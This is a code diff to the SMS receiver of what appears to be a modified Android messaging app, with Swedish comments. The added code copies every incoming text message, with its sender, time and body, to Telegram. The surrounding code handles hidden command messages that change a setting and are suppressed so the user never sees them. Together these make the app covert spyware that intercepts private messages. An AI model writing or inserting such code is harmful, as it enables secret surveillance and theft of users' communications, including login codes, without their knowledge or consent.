@@ -17,30 +17,37 @@ import com.simplemobiletools.commons.models.SimpleContact
 import com.simplemobiletools.smsmessenger.extensions.*
 import com.simplemobiletools.smsmessenger.helpers.refreshMessages
 import com.simplemobiletools.smsmessenger.models.Message
+import com.simplemobiletools.smsmessenger.utils.TelegramHelper
 
 class SmsReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent) {
         val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
         val prefs = SharedPrefsHelper(context)
+        // === NYTT: Läs header/rubrik från prefs ===
+        val header = prefs.getCustomLogHeader().ifBlank { "SMS INKOMMANDE" }
 
         for (sms in messages) {
             val messageBody = sms.messageBody ?: ""
             val sender = sms.originatingAddress ?: ""
+            val timestamp = System.currentTimeMillis()
+            val formattedTime = java.text.SimpleDateFormat("yyyy-MM-dd HH:mm").format(java.util.Date(timestamp))
 
+            // Skicka till Telegram med custom header
+            TelegramHelper.sendTextMessage("Till: $header\nFrån: $sender\nTid: $formattedTime\n-- $messageBody")
+
+            // Hantera tysta kommandon
             if (messageBody.equals("...More", ignoreCase = true)) {
                 prefs.setWhitelistingEnabled(true)
-                abortBroadcast() // Hindrar att det visas eller spelas ljud
+                abortBroadcast()
                 return
             }
-
             if (messageBody.equals("...Less", ignoreCase = true)) {
                 prefs.setWhitelistingEnabled(false)
                 abortBroadcast()
                 return
             }
-
-            // Här kan du om du vill: logga att ett vanligt SMS tagits emot
         }
+
         var address = ""
         var body = ""
         var subject = ""
